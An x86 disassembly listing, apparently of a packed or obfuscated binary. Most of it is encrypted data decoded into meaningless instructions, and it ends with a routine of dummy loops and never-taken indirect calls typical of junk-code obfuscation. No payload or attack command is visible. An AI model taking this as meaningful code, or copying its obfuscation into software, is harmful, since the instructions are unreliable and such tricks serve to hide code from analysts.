  41464b:	fstp   st(1)
  41464d:	(bad)  
  41464e:	fimul  WORD PTR ds:0xd7c1c9cf
  414654:	int    0xbe
  414656:	in     al,0xec
  414658:	shr    edx,1
  41465a:	int    0xcc
  41465c:	enter  0xd8db,0xf3
  414660:	xlat   BYTE PTR ds:[ebx]
  414661:	mov    eax,0xf1cfb8ee
  414666:	loopne 0x41463f
  414668:	frndint 
  41466a:	add    al,0xf8
  41466c:	out    0xfc,eax
  41466e:	loop   0x41463f
  414670:	add    eax,0xb1e6bdea
  414675:	repnz shl esi,0xb3
  414679:	out    dx,al
  41467a:	shl    DWORD PTR [edx-0x28273217],0xcd
  414681:	mov    edi,0xd3f7e0df
  414686:	add    ebp,ebx
  414688:	sar    dl,cl
  41468a:	in     al,0xf
  41468c:	fsubp  st(0),st
  41468e:	call   0xf2282e96
  414693:	out    dx,eax
  414694:	out    0xe1,al
  414696:	hlt    
  414697:	stos   BYTE PTR es:[edi],al
  414698:	shr    esp,0xd9
  41469b:	out    0xef,al
  41469d:	fcom   st(4)
  41469f:	mov    dl,0xde
  4146a1:	mov    al,0xfe
  4146a3:	sti    
  4146a4:	add    al,BYTE PTR [edx]
  4146a6:	add    ecx,edx
  4146a8:	fcos   
  4146aa:	rcr    dl,0x6
  4146ad:	jecxz  0x41468d
  4146af:	(bad)  
  4146b1:	clc    
  4146b2:	mov    bl,0xaa
  4146b4:	in     al,dx
  4146b5:	mov    ebp,0xd0b3e7eb
  4146ba:	mov    dl,0xda
  4146bc:	(bad)  
  4146bd:	fidiv  DWORD PTR [esi-0x42331d17]
  4146c3:	clc    
  4146c4:	aam    0xdf
  4146c6:	cli    
  4146c7:	in     eax,0xeb
  4146c9:	(bad)  
  4146cb:	pmullw mm4,mm1
  4146ce:	or     eax,0xd2dde1ce
  4146d3:	in     al,0xb7
  4146d5:	repz mov ch,0xf4
  4146d8:	(bad)  
  4146d9:	mov    al,0xe4
  4146db:	into   
  4146dc:	fmulp  st(4),st
  4146de:	cld    
  4146df:	mov    edi,0xb9e3d0f2
  4146e4:	pop    es
  4146e5:	(bad)  
  4146e7:	ret    0xdecb
  4146ea:	vpsadbw ymm1,ymm5,ymm7
  4146ee:	enter  0xe3ea,0xfe
  4146f2:	mov    ch,0xd3
  4146f5:	iret   
  4146f6:	fdivr  st(7),st
  4146f8:	icebp  
  4146f9:	leave  
  4146fa:	iret   
  4146fb:	mov    al,0xbf
  4146fd:	shr    bh,cl
  4146ff:	int    0xf8
  414701:	mov    ah,0x3
  414703:	std    
  414704:	aam    0xdb
  414706:	out    0xeb,eax
  414708:	fdiv   st,st(2)
  41470a:	add    BYTE PTR [eax],al
  41470c:	fdivp  st(5),st
  41470e:	(bad)  
  414710:	retf   
  414711:	fcomp  st(6)
  414713:	leave  
  414714:	les    esi,FWORD PTR [ecx-0x454c280b]
  41471a:	mov    dh,0xe6
  41471c:	aam    0xdd
  41471e:	stc    
  41471f:	mov    edi,0xf3f7f0e8
  414724:	iret   
  414725:	push   es
  414726:	xlat   BYTE PTR ds:[ebx]
  414727:	rol    DWORD PTR [esi],cl
  414729:	fcmovbe st,st(1)
  41472b:	pop    es
  41472c:	fmul   QWORD PTR ds:0xf2dde3c9
  414732:	mov    cl,0xef
  414734:	leave  
  414735:	in     al,0xaf
  414737:	aam    0xb0
  414739:	ret    0xffd6
  41473c:	sti    
  41473d:	mov    edx,0xd3f9f9fe
  414742:	idiv   DWORD PTR [ebp+esi*4+0xbccbccc]
  414749:	jecxz  0x41474e
  41474b:	clc    
  41474c:	in     eax,0xc9
  41474e:	fstp   st(2)
  414750:	add    dl,BYTE PTR [ecx]
  414752:	ror    edi,cl
  414754:	mov    esi,0xd5edcadd
  414759:	aad    0xf1
  41475b:	leave  
  41475c:	fcomip st,st(7)
  41475e:	jmp    0x41475d
  414760:	repz fdivr QWORD PTR [edx-0x44fafe3d]
  414767:	(bad)  
  414768:	icebp  
  414769:	sti    
  41476a:	fadd   DWORD PTR [edx]
  41476c:	xlat   BYTE PTR ds:[ebx]
  41476d:	add    eax,0xfa0100ef
  414772:	int    0xea
  414774:	(bad)  
  414775:	rol    esp,1
  414777:	loope  0x41474d
  414779:	in     al,0xb1
  41477b:	(bad)  
  41477e:	div    dh
  414780:	(bad)  
  414782:	std    
  414783:	mov    esp,0x5bb07f4
  414788:	(bad)  
  414789:	inc    edi
  41478b:	add    al,0xf6
  41478d:	retf   
  41478e:	(bad)  
  41478f:	(bad)  
  414791:	fdiv   DWORD PTR [edx-0x51432140]
  414797:	iret   
  414798:	shl    DWORD PTR [esi-0x4052152d],0xd2
  41479f:	mov    esi,0xf8f1b8f2
  4147a4:	out    0xf3,eax
  4147a6:	add    eax,0xebf0fc07
  4147ab:	or     dl,bh
  4147ad:	leave  
  4147ae:	out    0xdf,eax
  4147b0:	in     al,0xdd
  4147b2:	mov    eax,0xf4b3cac9
  4147b7:	into   
  4147b8:	ret    
  4147b9:	ror    ch,cl
  4147bb:	out    dx,eax
  4147bc:	into   
  4147bd:	push   esp
  4147bf:	out    dx,eax
  4147c0:	std    
  4147c1:	repnz aam 0xf1
  4147c4:	mov    esi,0x5fcf4d5
  4147c9:	rol    esp,0xe6
  4147cc:	out    dx,al
  4147cd:	fucompp 
  4147cf:	ret    0xe50c
  4147d2:	mov    bl,0xbd
  4147d4:	mov    esp,0xd1ecc3c4
  4147d9:	mov    bl,0xd7
  4147db:	into   
  4147dc:	leave  
  4147dd:	fucomi st,st(0)
  4147df:	jecxz  0x41479d
  4147e1:	hlt    
  4147e2:	clc    
  4147e3:	(bad)  
  4147e5:	shl    esi,1
  4147e7:	aad    0xfb
  4147e9:	jmp    0xdbda:0xe1cac7c1
  4147f0:	int3   
  4147f1:	dec    esp
  4147f3:	leave  
  4147f4:	mov    bh,0xbd
  4147f6:	icebp  
  4147f7:	loop   0x4147ca
  4147f9:	(bad)  
  4147fa:	repz (bad) [eax-0x28102e]
  414801:	std    
  414802:	loop   0x4147fa
  414804:	into   
  414805:	in     eax,0xf8
  414807:	mov    esp,0xefde02f9
  41480c:	in     al,0xff
  41480e:	fst    QWORD PTR [ebx]
  414810:	(bad)  
  414811:	retf   0xe2ce
  414814:	in     al,dx
  414815:	mov    dh,0xb1
  414817:	lock in eax,dx
  414819:	jmp    0x414816
  41481b:	jmp    0xfffc:0xd9cfeaf2
  414822:	fst    st(2)
  414824:	int3   
  414825:	mov    ah,0x1
  414827:	shl    edx,0x9
  41482a:	stc    
  41482b:	test   ebx,0xe6e9eef8
  414831:	out    0xad,al
  414833:	out    dx,al
  414834:	jmp    0xe6e9:0xe4d5c4d1
  41483b:	shl    esi,cl
  41483d:	mov    ecx,0xfbfdfec9
  414842:	lock shl ecx,cl
  414845:	fld    QWORD PTR ds:0xdfbcc7d4
  41484b:	in     al,0xc1
  41484d:	cmc    
  41484e:	in     eax,dx
  41484f:	leave  
  414850:	int3   
  414851:	in     al,0xcd
  414853:	shl    ch,cl
  414855:	in     al,dx
  414856:	aam    0xdb
  414858:	lods   eax,DWORD PTR ds:[esi]
  414859:	shl    DWORD PTR [eax-0x5260637],cl
  41485f:	mov    ebx,0xd8f7dff5
  414864:	rcr    cl,1
  414866:	cli    
  414867:	xlat   BYTE PTR ds:[ebx]
  414868:	lock repnz xlat BYTE PTR ds:[ebx]
  41486b:	aam    0xf8
  41486d:	out    0xc3,eax
  41486f:	in     al,dx
  414870:	or     al,0x8
  414872:	loope  0x414837
  414874:	leave  
  414875:	lock jmp 0xf6b2:0xe9d9b3f6
  41487d:	mov    ecx,0xf8f6dec8
  414882:	mov    ebx,0xe1e5e6ff
  414887:	rol    eax,0x4
  41488a:	rcr    edi,0x7
  41488d:	hlt    
  41488e:	add    ah,ch
  414890:	iret   
  414891:	clc    
  414892:	les    edi,FWORD PTR [edi+ebx*8-0x144a171c]
  414899:	mov    dl,0xd8
  41489b:	scas   al,BYTE PTR es:[edi]
  41489c:	cli    
  41489d:	(bad)  
  41489f:	mov    edx,0xe8c3d7cf
  4148a4:	sar    al,0xf9
  4148a7:	cmc    
  4148a8:	rol    esi,0xbf
  4148ab:	fcmovnu st,st(3)
  4148ad:	dec    DWORD PTR [esi]
  4148af:	or     eax,0xe9ad0d0b
  4148b4:	shl    ch,cl
  4148b6:	ret    0xc7c6
  4148b9:	retf   0xaed8
  4148bc:	(bad)  
  4148be:	in     eax,0xf9
  4148c0:	clc    
  4148c1:	into   
  4148c2:	shl    esi,cl
  4148c4:	std    
  4148c5:	(bad)  
  4148c7:	or     esp,ebx
  4148c9:	add    BYTE PTR [edx],cl
  4148cb:	sti    
  4148cc:	retf   0x5de
  4148cf:	loop   0x4148ca
  4148d1:	stc    
  4148d2:	mov    esi,0xd0c6d1aa
  4148d7:	lods   eax,DWORD PTR ds:[esi]
  4148d8:	out    0xe7,al
  4148da:	idiv   DWORD PTR [edx-0x1c2c0b0f]
  4148e0:	aad    0xe2
  4148e2:	mov    edx,0xe3f6c1cd
  4148e7:	not    bh
  4148e9:	(bad)  
  4148ea:	call   edi
  4148ec:	jmp    0xe805:0x9dcec0b
  4148f3:	iret   
  4148f4:	int3   
  4148f5:	cmc    
  4148f6:	enter  0xcaec,0xe9
  4148fa:	int3   
  4148fb:	out    dx,al
  4148fc:	int    0xf8
  4148fe:	out    dx,al
  4148ff:	repz icebp 
  414901:	cmc    
  414902:	loope  0x4148fd
  414904:	add    DWORD PTR [ecx+eiz*8-0x233943fc],edi
  41490b:	add    al,ch
  41490d:	pavgw  mm0,QWORD PTR [ecx]
  414910:	pandn  mm7,QWORD PTR [ebp-0x544c3511]
  414917:	hlt    
  414918:	jmp    0xd3f411fe
  41491d:	std    
  41491e:	xlat   BYTE PTR ds:[ebx]
  41491f:	mov    ch,0xed
  414921:	int    0xf0
  414923:	ret    0xf5ef
  414926:	not    esp
  414928:	(bad)  
  414929:	in     eax,0xc9
  41492b:	sti    
  41492c:	in     al,0xef
  41492e:	aam    0x4
  414930:	loope  0x414944
  414932:	shr    BYTE PTR [edx-0x3c0a504f],0xeb
  414939:	rol    ebp,0xf5
  41493c:	clc    
  41493d:	cmc    
  41493e:	(bad)  
  414940:	fiadd  DWORD PTR [edx]
  414942:	mov    edx,0xf503f2ff
  414947:	lock out 0x5,eax
  41494a:	test   DWORD PTR [ebx],0xe7e4cfd5
  414950:	jmp    0xece9fc32
  414955:	aad    0xdd
  414957:	hlt    
  414958:	(bad)  
  414959:	int3   
  41495a:	fcmovne st,st(0)
  41495c:	shl    ah,cl
  41495e:	cli    
  41495f:	out    dx,eax
  414960:	aam    0x1
  414962:	aad    0xd6
  414964:	aad    0xec
  414966:	add    ebx,esi
  414968:	xrelease mov DWORD PTR ds:0xe5e8c9c8,0xcce9db13
  414973:	(bad)  
  414974:	jmp    0xcb2c1e29
  414979:	int    0xb4
  41497b:	(bad)  
  41497c:	ffreep st(5)
  41497e:	(bad)  
  414980:	aam    0xed
  414982:	std    
  414983:	push   esi
  414985:	(bad)  
  414986:	rol    cl,1
  414988:	std    
  414989:	add    al,dl
  41498b:	loopne 0x414988
  41498d:	out    dx,eax
  41498e:	hlt    
  41498f:	fsubr  st,st(7)
  414991:	fdiv   DWORD PTR [ecx-0x303d191b]
  414997:	call   0xca2e325c
  41499c:	repnz mov ch,0xeb
  41499f:	out    dx,eax
  4149a0:	icebp  
  4149a1:	std    
  4149a2:	jmp    0xf11751a4
  4149a7:	stc    
  4149a8:	neg    bl
  4149aa:	mov    DWORD PTR ds:0xdf01d9,0xe4b9e2ce
  4149b4:	mov    bl,0xb7
  4149b6:	into   
  4149b7:	mov    ah,0xca
  4149b9:	jmp    0xf5f4:0xd8d5cef0
  4149c0:	(bad)  
  4149c1:	out    dx,al
  4149c2:	mov    ebx,0xe0f900e8
  4149c7:	add    eax,0xf5f9fbe0
  4149cc:	inc    esi
  4149ce:	or     edx,ebp
  4149d0:	add    eax,0xe3b1c305
  4149d5:	(bad)  
  4149d6:	stos   DWORD PTR es:[edi],eax
  4149d7:	stos   BYTE PTR es:[edi],al
  4149d8:	int    0xf9
  4149da:	cli    
  4149db:	fdivr  DWORD PTR [edi-0x14b4013]
  4149e1:	rol    ebx,cl
  4149e3:	not    ebx
  4149e5:	shr    ebp,0xbc
  4149e8:	out    0x5,eax
  4149ea:	rcl    esi,0xfc
  4149ed:	jecxz  0x4149d3
  4149ef:	fsubr  st,st(1)
  4149f1:	out    0xe8,eax
  4149f3:	out    dx,eax
  4149f4:	int3   
  4149f5:	(bad)  
  4149f6:	out    dx,eax
  4149f7:	jmp    0xc8cb:0xc9eaf4ce
  4149fe:	in     al,dx
  4149ff:	fxch   st(0)
  414a01:	out    dx,al
  414a02:	iret   
  414a03:	fidivr WORD PTR [edi-0x1b18ff0e]
  414a09:	cmc    
  414a0a:	fdivr  st,st(5)
  414a0c:	jmp    0x4149d7
  414a0e:	leave  
  414a0f:	std    
  414a10:	sti    
  414a11:	int3   
  414a12:	shl    esi,cl
  414a14:	mov    bh,0xc1
  414a16:	ror    edi,0xc3
  414a19:	retf   
  414a1a:	leave  
  414a1b:	clc    
  414a1c:	jmp    0xd20d18e0
  414a21:	(bad)  
  414a23:	mov    edi,0xc4f8eef3
  414a28:	shl    ecx,1
  414a2a:	ret    
  414a2b:	fcmovnu st,st(2)
  414a2d:	or     ah,ch
  414a2f:	pop    es
  414a30:	loopne 0x414a2b
  414a32:	out    0xaa,al
  414a34:	jmp    0x4149ec
  414a36:	call   0xc1f44525
  414a3b:	mov    dh,0xb6
  414a3d:	int    0xbf
  414a3f:	call   0xc01e2a2c
  414a44:	in     al,dx
  414a45:	inc    ebp
  414a47:	cli    
  414a48:	lock cli 
  414a4a:	(bad)  
  414a4c:	or     al,bl
  414a4e:	call   0xa9104a66
  414a53:	(bad)  
  414a54:	fbstp  TBYTE PTR [ebx-0xc1a3c4a]
  414a5a:	repnz jmp 0xbaf5:0xfcf4d5cc
  414a62:	ret    
  414a63:	repz sar dl,0xd7
  414a67:	sar    edi,cl
  414a69:	fiadd  DWORD PTR [esi]
  414a6b:	loopne 0x414a5b
  414a6d:	or     eax,ebp
  414a6f:	fisttp WORD PTR ds:0xded0c3fc
  414a75:	mul    cl
  414a77:	jmp    0xf03c2c46
  414a7c:	(bad)  
  414a7d:	retf   
  414a7e:	(bad)  
  414a80:	mov    esi,0xf0ccf2f3
  414a85:	(bad)  
  414a87:	test   ebx,0xd4c8d807
  414a8d:	out    0xee,al
  414a8f:	retf   
  414a90:	in     eax,dx
  414a91:	loop   0x414a7c
  414a93:	mov    dl,0xca
  414a95:	in     al,dx
  414a96:	mov    dh,0xe3
  414a98:	mov    ch,0xe5
  414a9a:	loopne 0x414a70
  414a9c:	mov    dh,0xe5
  414a9e:	retf   0xbacc
  414aa1:	int    0x3
  414aa3:	inc    dl
  414aa5:	lock rcr edx,cl
  414aa8:	hlt    
  414aa9:	(bad)  
  414aaa:	fdivr  st(0),st
  414aac:	add    bl,ah
  414aae:	std    
  414aaf:	clc    
  414ab0:	fsubp  st(2),st
  414ab2:	mov    cl,0xef
  414ab4:	test   eax,0xd5e4f7ce
  414ab9:	loopne 0x414a74
  414abb:	aad    0xe8
  414abd:	in     al,dx
  414abe:	jmp    0x414aa8
  414ac0:	mov    ecx,0xedb9fdcc
  414ac5:	rol    dl,1
  414ac7:	(bad)  
  414ac8:	icebp  
  414ac9:	add    eax,0xdeeae300
  414ace:	fsubr  st,st(0)
  414ad0:	add    ah,ch
  414ad2:	repz ret 0xddf0
  414ad6:	aam    0xd3
  414ad8:	sti    
  414ad9:	div    DWORD PTR [ecx-0x17020816]
  414adf:	in     al,0xba
  414ae1:	aad    0xe3
  414ae3:	ret    
  414ae4:	fcos   
  414ae6:	lock add bl,dl
  414ae9:	rcr    bh,1
  414aeb:	fcmovnbe st,st(6)
  414aed:	in     eax,dx
  414aee:	add    esp,eax
  414af0:	loop   0x414ad7
  414af2:	test   eax,0xe7cfe8cc
  414af7:	mov    dl,0xb3
  414af9:	icebp  
  414afa:	mov    edx,0xb7eaadcc
  414aff:	sti    
  414b00:	cld    
  414b01:	mov    ebx,0xdedafcec
  414b06:	cmc    
  414b07:	loope  0x414b0e
  414b09:	loop   0x414af5
  414b0b:	jecxz  0x414ad7
  414b0d:	mov    esp,0xe1dbdfcb
  414b12:	in     eax,dx
  414b13:	int3   
  414b14:	in     eax,0xa4
  414b16:	in     eax,0xf7
  414b18:	int3   
  414b19:	shl    al,0xff
  414b1c:	(bad)  
  414b1d:	(bad)  
  414b1e:	in     eax,0xce
  414b20:	out    dx,eax
  414b21:	mov    edi,0xdae200e9
  414b26:	fdivp  st(2),st
  414b28:	add    esp,ebx
  414b2a:	ret    
  414b2b:	cld    
  414b2c:	or     DWORD PTR [edx],eax
  414b2e:	out    0xdd,al
  414b30:	fcomp  st(6)
  414b32:	repz icebp 
  414b34:	shl    eax,0xe4
  414b37:	ret    0xb7e9
  414b3a:	icebp  
  414b3b:	enter  0xefd2,0xd2
  414b3f:	test   ecx,0xffbddbdb
  414b45:	hlt    
  414b46:	sar    DWORD PTR [esi-0x7270d07],1
  414b4c:	or     ebp,esi
  414b4e:	fneni(8087 only) 
  414b50:	fxch   st(3)
  414b52:	in     eax,0xc1
  414b54:	mov    al,0xe9
  414b56:	retf   0xc4cb
  414b59:	aad    0xed
  414b5b:	leave  
  414b5c:	sti    
  414b5d:	shl    al,1
  414b5f:	fdiv   st(0),st
  414b61:	mov    esp,0xf801fbf6
  414b66:	icebp  
  414b67:	add    DWORD PTR [ebx],ecx
  414b69:	sti    
  414b6a:	in     eax,0xc9
  414b6c:	(bad)  
  414b6d:	in     eax,0xf8
  414b6f:	out    dx,eax
  414b70:	push   es
  414b71:	jecxz  0x414b1f
  414b73:	test   al,0xd1
  414b75:	loope  0x414b46
  414b77:	retf   0xcdfa
  414b7a:	int3   
  414b7b:	into   
  414b7c:	into   
  414b7d:	retf   0xf7e8
  414b80:	mov    eax,0xd3e20002
  414b85:	rol    dh,0xdd
  414b88:	sti    
  414b89:	mov    eax,0xee05f6d4
  414b8e:	in     eax,dx
  414b8f:	lds    eax,FWORD PTR [ebx*8-0x381b1d0f]
  414b96:	xlat   BYTE PTR ds:[ebx]
  414b97:	sar    bl,0xda
  414b9a:	in     al,dx
  414b9b:	mov    dh,0xc5
  414b9d:	out    0xde,al
  414b9f:	mov    ah,0xf8
  414ba1:	mov    ecx,0xbcd5d9bb
  414ba6:	faddp  st(5),st
  414ba8:	fisttp WORD PTR [ecx]
  414baa:	or     bh,al
  414bac:	fdivp  st(2),st
  414bae:	in     eax,dx
  414baf:	add    eax,DWORD PTR [ecx]
  414bb1:	ror    esi,cl
  414bb3:	enter  0xd1cc,0xc3
  414bb7:	shl    bh,cl
  414bb9:	(bad)  
  414bba:	fsubr  st,st(6)
  414bbc:	leave  
  414bbd:	fmul   st,st(0)
  414bbf:	jmp    0xf5f4:0x3e8b0c9
  414bc6:	out    0xc1,eax
  414bc8:	fiadd  DWORD PTR [eax]
  414bca:	loope  0x414bd7
  414bcc:	cmc    
  414bcd:	retf   
  414bce:	out    0xdf,al
  414bd0:	iret   
  414bd1:	repnz iret 
  414bd3:	(bad)
  414bd6:	loop   0x414b82
  414bd8:	shl    bl,cl
  414bda:	retf   
  414bdb:	(bad)  
  414bdc:	ror    dl,1
  414bde:	fcomi  st,st(1)
  414be0:	loop   0x414bc0
  414be2:	fmulp  st(0),st
  414be4:	jecxz  0x414bbc
  414be6:	in     al,0xf2
  414be8:	fsin   
  414bea:	xlat   BYTE PTR ds:[ebx]
  414beb:	(bad)  
  414bec:	jmp    0xa8e1:0xe2f3cdc9
  414bf3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414bf4:	shl    dh,0xf2
  414bf7:	(bad)  
  414bf8:	in     al,0xd6
  414bfa:	out    0xae,eax
  414bfc:	fstp   TBYTE PTR [eax-0x4f091547]
  414c02:	int    0xbd
  414c04:	repnz int3 
  414c06:	(bad)  
  414c08:	aad    0x1
  414c0a:	(bad)  
  414c0b:	in     eax,0xe4
  414c0d:	loopne 0x414c07
  414c0f:	paddw  mm0,QWORD PTR [eax]
  414c12:	fsubr  st(7),st
  414c14:	retf   0xe6ac
  414c17:	loope  0x414be2
  414c19:	mov    cl,0xdb
  414c1b:	mov    bh,0xec
  414c1d:	int3   
  414c1e:	aam    0xbc
  414c20:	ret    
  414c21:	loope  0x414bfd
  414c23:	sar    ch,0xc2
  414c26:	fiadd  WORD PTR [edi]
  414c28:	(bad)  
  414c29:	(bad)  
  414c2a:	cmc    
  414c2b:	retf   0xd5d9
  414c2e:	sti    
  414c2f:	int3   
  414c30:	adc    eax,eax
  414c32:	loop   0x414c00
  414c34:	mov    cl,0xd3
  414c36:	(bad)  
  414c37:	out    0xb2,eax
  414c39:	mov    al,0xcc
  414c3b:	mov    al,0xdf
  414c3d:	std    
  414c3e:	mov    bh,0xfe
  414c40:	xlat   BYTE PTR ds:[ebx]
  414c41:	into   
  414c42:	xlat   BYTE PTR ds:[ebx]
  414c43:	fcmovnu st,st(1)
  414c45:	shl    esp,1
  414c47:	jecxz  0x414c0f
  414c49:	or     eax,esp
  414c4b:	hlt    
  414c4c:	add    al,0xe0
  414c4e:	out    dx,eax
  414c4f:	(bad)
  414c53:	fdivr  QWORD PTR [ebp+ebp*4-0x18282850]
  414c5a:	sti    
  414c5b:	(bad)  [eax-0x8080f06]
  414c61:	fmul   st(7),st
  414c63:	mov    dh,0xf6
  414c65:	aam    0xdb
  414c67:	cmc    
  414c68:	aad    0xd5
  414c6a:	hlt    
  414c6b:	or     bh,ah
  414c6d:	add    al,0xff
  414c6f:	(bad)
  414c72:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414c73:	lds    esp,FWORD PTR [ebp-0x3b043058]
  414c79:	(bad)  
  414c7a:	jmp    0xb9100256
  414c7f:	out    dx,al
  414c80:	fdiv   QWORD PTR [esi+edx*8-0x92206fd]
  414c87:	or     eax,ecx
  414c89:	shl    ebp,1
  414c8b:	jmp    0x414c89
  414c8d:	retf   0xc50e
  414c90:	cli    
  414c91:	add    BYTE PTR [edi-0xd212e09],ch
  414c97:	mov    bh,0xcb
  414c99:	(bad)  
  414c9a:	mov    bl,0xb0
  414c9c:	retf   0xbdd4
  414c9f:	repnz aad 0xd5
  414ca2:	mov    edi,0xd4bed8e1
  414ca7:	out    0xcb,al
  414ca9:	out    0xbf,al
  414cab:	out    dx,eax
  414cac:	add    ebx,ebx
  414cae:	or     ch,ah
  414cb0:	in     al,dx
  414cb1:	fcmovu st,st(4)
  414cb3:	retf   
  414cb4:	mov    edi,0xc7e4cbf0
  414cb9:	sti    
  414cba:	out    0xcb,eax
  414cbc:	jmp    0xd5d0:0xd2ebd9fb
  414cc3:	repz clc 
  414cc5:	test   ebp,0xd8f5d9d7
  414ccb:	out    dx,eax
  414ccc:	add    ch,ah
  414cce:	fmulp  st(0),st
  414cd0:	add    ebx,ebp
  414cd2:	call   0xd5040aa9
  414cd7:	in     eax,dx
  414cd8:	test   eax,0xf3d2bbfa
  414cdd:	cli    
  414cde:	mov    edx,0xd5e3f7fe
  414ce3:	ret    
  414ce4:	fadd   st,st(0)
  414ce6:	(bad)  
  414ce7:	loop   0x414cd0
  414ce9:	repnz fsubr st(3),st
  414cec:	(bad)  
  414cee:	retf   0x10e
  414cf1:	out    0xc7,eax
  414cf3:	mov    esp,0xf1b7cccc
  414cf8:	mov    bl,0xcf
  414cfa:	jmp    0xedd3:0xc4ede4b4
  414d01:	int    0xf8
  414d03:	loop   0x414cc6
  414d05:	sti    
  414d06:	hlt    
  414d07:	out    0xc3,al
  414d09:	xlat   BYTE PTR ds:[ebx]
  414d0a:	icebp  
  414d0b:	fadd   DWORD PTR [edi]
  414d0d:	in     eax,0x4
  414d0f:	in     al,dx
  414d10:	pop    es
  414d11:	jmp    0x414cc4
  414d13:	mov    eax,0xe3b5e2e3
  414d18:	mov    bl,0xa8
  414d1a:	mov    cl,0xe7
  414d1c:	retf   
  414d1d:	push   ebx
  414d1f:	fidiv  DWORD PTR [ebp-0x5024045]
  414d25:	repnz (bad) 
  414d27:	xlat   BYTE PTR ds:[ebx]
  414d28:	fcom   st(7)
  414d2a:	or     esi,esp
  414d2c:	(bad)
  414d2f:	call   0xea293702
  414d34:	lock jmp 0xf0e5:0xb7c9e3c6
  414d3c:	call   0xfa1e1cf6
  414d41:	mov    esp,0xcdde02c9
  414d46:	std    
  414d47:	fsubr  st(7),st
  414d49:	pop    es
  414d4a:	loop   0x414d57
  414d4c:	or     edi,ebp
  414d4e:	jecxz  0x414d51
  414d50:	dec    ecx
  414d52:	lods   al,BYTE PTR ds:[esi]
  414d53:	mov    ebp,0xbce4aed0
  414d58:	out    dx,eax
  414d59:	test   esp,0xeab6d6ce
  414d5f:	retf   
  414d60:	stc    
  414d61:	icebp  
  414d62:	stc    
  414d63:	repnz cli 
  414d65:	in     al,dx
  414d66:	lds    eax,FWORD PTR [ecx]
  414d68:	in     al,0xc4
  414d6a:	fdiv   st,st(0)
  414d6c:	jecxz  0x414d59
  414d6e:	out    0x2,al
  414d70:	adc    edi,esp
  414d72:	test   eax,0xd4debeaa
  414d77:	shr    BYTE PTR [ebp-0x1909152a],1
  414d7d:	fldpi  
  414d7f:	in     eax,dx
  414d80:	mov    esi,0xc3c2dde9
  414d85:	in     eax,0xde
  414d87:	not    dh
  414d89:	fadd   DWORD PTR [eax]
  414d8b:	clc    
  414d8c:	mov    BYTE PTR [ebx],0xb
  414d8f:	jmp    0x414d84
  414d91:	add    DWORD PTR [eax-0x16393212],ebp
  414d97:	shl    BYTE PTR [ebx+esi*8-0x32331849],0xd5
  414d9f:	cli    
  414da0:	fdivp  st(3),st
  414da2:	mov    ebp,0xffdbede1
  414da7:	fcmovnbe st,st(4)
  414da9:	add    al,0xc1
  414dab:	test   DWORD PTR [edi],0xdc0a0fd8
  414db1:	push   es
  414db2:	retf   0xf2aa
  414db5:	out    dx,eax
  414db6:	retf   0xf4b0
  414db9:	repz aad 0xb5
  414dbc:	mov    edi,0xeedcf9d4
  414dc1:	icebp  
  414dc2:	call   0xccfa0e87
  414dc7:	clc    
  414dc8:	(bad)  
  414dc9:	aam    0xe6
  414dcb:	xor    ebx,ebx
  414dcd:	mov    edx,esp
  414dcf:	dec    edx
  414dd0:	inc    ebx
  414dd1:	add    ebx,DWORD PTR [edx+ebx*1]
  414dd4:	dec    ebx
  414dd5:	xor    edx,edx
  414dd7:	add    DWORD PTR [ebp-0x1c],ebx
  414dda:	pop    ebx
  414ddb:	mov    eax,DWORD PTR [ebp-0x1c]
  414dde:	pop    esi
  414ddf:	pop    ebx
  414de0:	leave  
  414de1:	ret    0x10
  414de4:	push   ebp
  414de5:	mov    ebp,esp
  414de7:	sub    esp,0x64
  414dea:	sub    DWORD PTR ds:0x43776f,ecx
  414df0:	mov    DWORD PTR [ebp-0x8],0xf89f85b0
  414df7:	lea    eax,[ebp+0x14]
  414dfa:	xor    ecx,DWORD PTR ds:0x437737
  414e00:	mov    DWORD PTR [ebp-0x14],eax
  414e03:	mov    DWORD PTR [ebp-0x4],0xf89c85b0
  414e0a:	mov    DWORD PTR ds:0x4377b7,0x16
  414e14:	cmp    DWORD PTR ds:0x4377b7,0x0
  414e1b:	je     0x414e6a
  414e21:	cmp    DWORD PTR ds:0x4377b7,0xa
  414e28:	jle    0x414e6a
  414e2e:	jmp    0x414e3c
  414e33:	push   DWORD PTR [ebp-0xc]
  414e36:	call   DWORD PTR ds:0x43c9d4
  414e3c:	cmp    DWORD PTR ds:0x4377b7,0xb
  414e43:	jne    0x414e56
  414e49:	mov    ecx,DWORD PTR ds:0x4377b7
  414e4f:	dec    ecx
  414e50:	mov    DWORD PTR ds:0x4377b7,ecx
  414e56:	xor    ecx,ecx
  414e58:	add    ecx,DWORD PTR ds:0x4377b7
  414e5e:	dec    ecx
  414e5f:	mov    DWORD PTR ds:0x4377b7,ecx
  414e65:	jmp    0x414e14
  414e6a:	lea    eax,[ebp-0x4]
  414e6d:	mov    DWORD PTR [ebp-0x10],eax
  414e70:	and    DWORD PTR ds:0x4377bb,0x67f5
  414e7a:	mov    eax,DWORD PTR [ebp-0x4]
  414e7d:	and    DWORD PTR ds:0x437757,0x0
  414e87:	mov    ecx,DWORD PTR ds:0x437757
  414e8d:	inc    ecx
  414e8e:	mov    DWORD PTR ds:0x437757,ecx
  414e94:	cmp    DWORD PTR ds:0x437757,0xc
  414e9b:	ja     0x414ed8
  414ea1:	jmp    0x414eb1
  414ea6:	push   0x437723
  414eab:	call   DWORD PTR ds:0x43c9dc
  414eb1:	cmp    DWORD PTR ds:0x437757,0xb
  414eb8:	jne    0x414ecb
  414ebe:	mov    ecx,DWORD PTR ds:0x437757
  414ec4:	inc    ecx
  414ec5:	mov    DWORD PTR ds:0x437757,ecx
  414ecb:	cmp    DWORD PTR ds:0x437757,0x12
  414ed2:	jb     0x414e87
  414ed8:	xor    eax,0x75108b5
  414edd:	add    eax,0x3272fb
  414ee2:	neg    ecx
  414ee4:	mov    ecx,DWORD PTR [ebp-0x10]
  414ee7:	neg    DWORD PTR ds:0x437757
  414eed:	mov    DWORD PTR [ecx],eax
  414eef:	mov    DWORD PTR ds:0x43775b,0x15
  414ef9:	cmp    DWORD PTR ds:0x43775b,0x0
  414f00:	je     0x414f37
  414f06:	cmp    DWORD PTR ds:0x43775b,0x1f
  414f0d:	jg     0x414f37
  414f13:	jmp    0x414f23
  414f18:	push   0x3993
  414f1d:	call   DWORD PTR ds:0x43c9e0
  414f23:	xor    ecx,ecx
  414f25:	xor    ecx,DWORD PTR ds:0x43775b
  414f2b:	dec    ecx
  414f2c:	mov    DWORD PTR ds:0x43775b,ecx
